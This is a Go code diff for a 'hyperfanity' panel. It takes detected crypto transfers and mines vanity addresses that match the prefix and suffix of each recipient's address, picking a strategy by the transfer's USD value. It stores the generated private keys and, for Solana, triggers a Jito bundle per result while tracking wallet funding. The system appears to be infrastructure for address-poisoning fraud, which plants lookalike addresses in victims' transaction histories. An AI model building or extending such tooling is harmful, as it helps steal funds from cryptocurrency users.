@@ -9,6 +9,7 @@ import (
 	"log"
 	"net"
 	"net/http"
+	"os"
 	"strings"
 
 	"github.com/user/hyperfanity/panel/db"
@@ -21,12 +22,18 @@ import (
 // PanelServer implements the gRPC HyperfanityService and the HTTP web UI.
 type PanelServer struct {
 	pb.UnimplementedHyperfanityServiceServer
-	db *db.DB
+	db              *db.DB
+	postResultHandler *PostResultHandler
+	balanceChecker  *BalanceChecker
 }
 
 // NewPanelServer creates a new panel server.
-func NewPanelServer(database *db.DB) *PanelServer {
-	return &PanelServer{db: database}
+func NewPanelServer(database *db.DB, postResultHandler *PostResultHandler, balanceChecker *BalanceChecker) *PanelServer {
+	return &PanelServer{
+		db:                database,
+		postResultHandler: postResultHandler,
+		balanceChecker:    balanceChecker,
+	}
 }
 
 // =============================================================================
@@ -101,10 +108,12 @@ func (s *PanelServer) ReportResult(ctx context.Context, req *pb.VanityResult) (*
 		PrivateKey: req.PrivateKey,
 		PublicKey:  req.PublicKey,
 	}
-	if _, err := s.db.CreateResult(ctx, result); err != nil {
+	resultID, err := s.db.CreateResult(ctx, result)
+	if err != nil {
 		log.Printf("[grpc] Error storing result: %v", err)
 		return &pb.Ack{Success: false, Message: err.Error()}, nil
 	}
+	result.ID = resultID
 
 	// Mark job complete
 	if err := s.db.CompleteJob(ctx, req.JobId); err != nil {
@@ -118,6 +127,22 @@ func (s *PanelServer) ReportResult(ctx context.Context, req *pb.VanityResult) (*
 	}
 
 	log.Printf("[grpc] Result for job %s: %s (score %d)", req.JobId[:12], req.Address, req.Score)
+
+	// Trigger post-result handling (Jito bundle for Solana)
+	if s.postResultHandler != nil {
+		// Get the associated event to get recipient address
+		job, _ := s.db.GetJob(ctx, req.JobId)
+		var event *db.Event
+		if job != nil && job.EventID != nil {
+			event, _ = s.db.GetEvent(ctx, *job.EventID)
+		}
+		go func() {
+			if err := s.postResultHandler.HandleResult(context.Background(), result, event); err != nil {
+				log.Printf("[grpc] Post-result handler error: %v", err)
+			}
+		}()
+	}
+
 	return &pb.Ack{Success: true, Message: "result accepted"}, nil
 }
 
@@ -156,6 +181,9 @@ func (s *PanelServer) StartHTTP(addr string) error {
 	// Dashboard page
 	mux.HandleFunc("/", s.handleDashboard)
 
+	// Wallets page
+	mux.HandleFunc("/wallets", s.handleWalletsPage)
+
 	// Webhook for scanner events
 	mux.HandleFunc("/webhook", s.handleWebhook)
 
@@ -165,6 +193,8 @@ func (s *PanelServer) StartHTTP(addr string) error {
 	mux.HandleFunc("/api/workers", s.handleAPIWorkers)
 	mux.HandleFunc("/api/strategies", s.handleAPIStrategies)
 	mux.HandleFunc("/api/rules", s.handleAPIRules) // Active rules only
+	mux.HandleFunc("/api/wallets", s.handleAPIWallets)
+	mux.HandleFunc("/api/wallets/rescan", s.handleAPIWalletsRescan)
 
 	log.Printf("[http] Listening on %s", addr)
 	return http.ListenAndServe(addr, mux)
@@ -405,7 +435,7 @@ func parseRule(rule string) (*float64, *float64, int, int, error) {
 		} else if n, _ := fmt.Sscanf(cond, "usd <= %f", &val); n == 1 {
 			maxUSD = &val
 		} else {
-			return nil, nil, 0, 0, fmt.Errorf("invalid condition: %s (use 'USD > X' or 'USD < X')")
+			return nil, nil, 0, 0, fmt.Errorf("invalid condition: %s (use 'USD > X' or 'USD < X')", cond)
 		}
 	}
 
@@ -599,6 +629,9 @@ func chainIDToName(chainID int, blockchain string) string {
 	if blockchain == "EVM" {
 		return "evm"
 	}
+	if blockchain == "SOL" {
+		return "sol"
+	}
 	switch chainID {
 	case 728126428: // Tron mainnet
 		return "trx"
@@ -608,10 +641,16 @@ func chainIDToName(chainID int, blockchain string) string {
 }
 
 // extractPattern derives the vanity pattern from an address.
-// For EVM: strips 0x prefix, takes first N chars (configurable via strategy).
-func extractPattern(address string, prefixChars, suffixChars int) string {
-	// Strip 0x prefix for EVM addresses
-	addr := strings.TrimPrefix(strings.ToLower(address), "0x")
+// For EVM: strips 0x prefix and lowercases. For SOL: preserves case (base58).
+func extractPattern(address string, prefixChars, suffixChars int, chain string) string {
+	var addr string
+	if chain == "sol" {
+		// Solana: base58 addresses are case-sensitive
+		addr = address
+	} else {
+		// EVM/TRX: strip 0x prefix, lowercase
+		addr = strings.TrimPrefix(strings.ToLower(address), "0x")
+	}
 
 	if prefixChars == 0 && suffixChars == 0 {
 		prefixChars = 4 // Default: match first 4 chars
@@ -625,6 +664,71 @@ func extractPattern(address string, prefixChars, suffixChars int) string {
 		pattern += addr[len(addr)-suffixChars:]
 	}
 	return pattern
+}
+
+// createJobFromTransfer is the shared logic for creating an event + job from a detected transfer.
+// Used by both the webhook handler and the internal SOL scanner.
+func createJobFromTransfer(ctx context.Context, database *db.DB, chain, blockchain, rpcURL, wssURL, sender, recipient, contract, tokenName string, chainID int, usdValue float64) (int64, string, int, int, error) {
+	// Get matching strategy based on USD value
+	strategy, err := database.GetMatchingStrategy(ctx, usdValue)
+	if err != nil {
+		log.Printf("[job] Error getting strategy: %v", err)
+	}
+
+	// Apply strategy or use defaults
+	prefixChars := 4
+	suffixChars := 0
+	var strategyID *int64
+
+	// SOL default: match 4 front + 4 back chars
+	if chain == "sol" {
+		suffixChars = 4
+	}
+
+	if strategy != nil {
+		prefixChars = strategy.PrefixChars
+		suffixChars = strategy.SuffixChars
+		strategyID = &strategy.ID
+	}
+
+	pattern := extractPattern(recipient, prefixChars, suffixChars, chain)
+
+	// Store the event
+	event := &db.Event{
+		ChainID:    chainID,
+		Chain:      chain,
+		Blockchain: blockchain,
+		RPCUrl:     rpcURL,
+		WSSUrl:     wssURL,
+		Sender:     sender,
+		Recipient:  recipient,
+		Contract:   contract,
+		TokenName:  tokenName,
+		USDValue:   usdValue,
+		Pattern:    pattern,
+	}
+	eventID, err := database.CreateEvent(ctx, event)
+	if err != nil {
+		return 0, "", 0, 0, fmt.Errorf("failed to create event: %w", err)
+	}
+
+	// Create a mining job from the event
+	job := &db.Job{
+		EventID:     &eventID,
+		Chain:       chain,
+		Pattern:     pattern,
+		PrefixChars: prefixChars,
+		SuffixChars: suffixChars,
+		StrategyID:  strategyID,
+	}
+	if err := database.CreateJob(ctx, job); err != nil {
+		return 0, "", 0, 0, fmt.Errorf("failed to create job: %w", err)
+	}
+
+	log.Printf("[job] Event %d -> Job %s (%s prefix=%d suffix=%d $%.2f from %s)",
+		eventID, job.ID[:12], chain, prefixChars, suffixChars, usdValue, recipient[:12])
+
+	return eventID, job.ID, prefixChars, suffixChars, nil
 }
 
 func (s *PanelServer) handleWebhook(w http.ResponseWriter, r *http.Request) {
@@ -642,79 +746,117 @@ func (s *PanelServer) handleWebhook(w http.ResponseWriter, r *http.Request) {
 	}
 
 	// Validate required fields
-	if req.RPCUrl == "" || req.Recipient == "" {
-		http.Error(w, "rpc_url and recipient address (\"2\") are required", http.StatusBadRequest)
+	if req.Recipient == "" || req.Sender == "" {
+		http.Error(w, "sender (\"1\") and recipient (\"2\") are required", http.StatusBadRequest)
 		return
 	}
 
 	chain := chainIDToName(req.ChainID, req.Blockchain)
 
-	// Get matching strategy based on USD value
-	strategy, err := s.db.GetMatchingStrategy(ctx, req.USDValue)
-	if err != nil {
-		log.Printf("[webhook] Error getting strategy: %v", err)
+	// Default rpc_url for SOL if not provided
+	if req.RPCUrl == "" && chain == "sol" {
+		req.RPCUrl = os.Getenv("SOLANA_RPC_URL")
 	}
-
-	// Apply strategy or use defaults
-	prefixChars := 4
-	suffixChars := 0
-	var strategyID *int64
-	if strategy != nil {
-		prefixChars = strategy.PrefixChars
-		suffixChars = strategy.SuffixChars
-		strategyID = &strategy.ID
-	}
-
-	// Derive pattern from recipient address
-	pattern := extractPattern(req.Recipient, prefixChars, suffixChars)
-
-	// Store the event
-	event := &db.Event{
-		ChainID:    req.ChainID,
-		Chain:      chain,
-		Blockchain: req.Blockchain,
-		RPCUrl:     req.RPCUrl,
-		WSSUrl:     req.WSSUrl,
-		Sender:     req.Sender,
-		Recipient:  req.Recipient,
-		Contract:   req.Contract,
-		TokenName:  req.TokenName,
-		USDValue:   req.USDValue,
-		Pattern:    pattern,
-	}
-	eventID, err := s.db.CreateEvent(ctx, event)
-	if err != nil {
-		log.Printf("[webhook] Error storing event: %v", err)
-		http.Error(w, "failed to store event", http.StatusInternalServerError)
+	if req.RPCUrl == "" {
+		http.Error(w, "rpc_url is required", http.StatusBadRequest)
 		return
 	}
 
-	// Create a mining job from the event
-	job := &db.Job{
-		EventID:     &eventID,
-		Chain:       chain,
-		Pattern:     pattern,
-		PrefixChars: prefixChars,
-		SuffixChars: suffixChars,
-		StrategyID:  strategyID,
-	}
-	if err := s.db.CreateJob(ctx, job); err != nil {
-		log.Printf("[webhook] Error creating job: %v", err)
-		http.Error(w, "failed to create job", http.StatusInternalServerError)
+	eventID, jobID, prefixChars, suffixChars, err := createJobFromTransfer(
+		ctx, s.db, chain, req.Blockchain, req.RPCUrl, req.WSSUrl,
+		req.Sender, req.Recipient, req.Contract, req.TokenName,
+		req.ChainID, req.USDValue,
+	)
+	if err != nil {
+		log.Printf("[webhook] Error: %v", err)
+		http.Error(w, err.Error(), http.StatusInternalServerError)
 		return
 	}
-
-	log.Printf("[webhook] Event %d -> Job %s (%s prefix=%d suffix=%d $%.2f from %s)",
-		eventID, job.ID[:12], chain, prefixChars, suffixChars, req.USDValue, req.Recipient[:12])
 
 	w.WriteHeader(http.StatusCreated)
 	writeJSON(w, map[string]interface{}{
 		"event_id":     eventID,
-		"job_id":       job.ID,
+		"job_id":       jobID,
 		"chain":        chain,
-		"pattern":      pattern,
 		"prefix_chars": prefixChars,
 		"suffix_chars": suffixChars,
 		"status":       "pending",
 	})
+}
+
+// =============================================================================
+// Wallets Page & API
+// =============================================================================
+
+func (s *PanelServer) handleWalletsPage(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "text/html; charset=utf-8")
+	w.Write([]byte(walletsHTML))
+}
+
+// walletJSON is the JSON representation of a wallet for the API.
+type walletJSON struct {
+	ID               int64   `json:"id"`
+	Address          string  `json:"address"`
+	BalanceLamports  int64   `json:"balance_lamports"`
+	BalanceSOL       float64 `json:"balance_sol"`
+	FundingStatus    string  `json:"funding_status"`
+	BundleID         string  `json:"bundle_id,omitempty"`
+	LastBalanceCheck string  `json:"last_balance_check,omitempty"`
+	CreatedAt        string  `json:"created_at"`
+}
+
+func (s *PanelServer) handleAPIWallets(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodGet {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	ctx := r.Context()
+
+	if s.balanceChecker == nil {
+		http.Error(w, "balance checker not initialized", http.StatusInternalServerError)
+		return
+	}
+
+	results, err := s.balanceChecker.GetSolanaWallets(ctx)
+	if err != nil {
+		log.Printf("[http] Error getting wallets: %v", err)
+		http.Error(w, "failed to get wallets", http.StatusInternalServerError)
+		return
+	}
+
+	wallets := make([]walletJSON, len(results))
+	for i, r := range results {
+		wallets[i] = walletJSON{
+			ID:              r.ID,
+			Address:         r.Address,
+			BalanceLamports: r.BalanceLamports,
+			BalanceSOL:      float64(r.BalanceLamports) / 1e9,
+			FundingStatus:   r.FundingStatus,
+			BundleID:        r.BundleID,
+			CreatedAt:       r.CreatedAt.Format("2006-01-02 15:04:05"),
+		}
+		if r.LastBalanceCheck != nil {
+			wallets[i].LastBalanceCheck = r.LastBalanceCheck.Format("2006-01-02 15:04:05")
+		}
+	}
+
+	writeJSON(w, wallets)
+}
+
+func (s *PanelServer) handleAPIWalletsRescan(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	if s.balanceChecker == nil {
+		http.Error(w, "balance checker not initialized", http.StatusInternalServerError)
+		return
+	}
+
+	s.balanceChecker.TriggerManualCheck(r.Context())
+	log.Printf("[http] Manual balance rescan triggered")
+
+	writeJSON(w, map[string]bool{"triggered": true})
 }
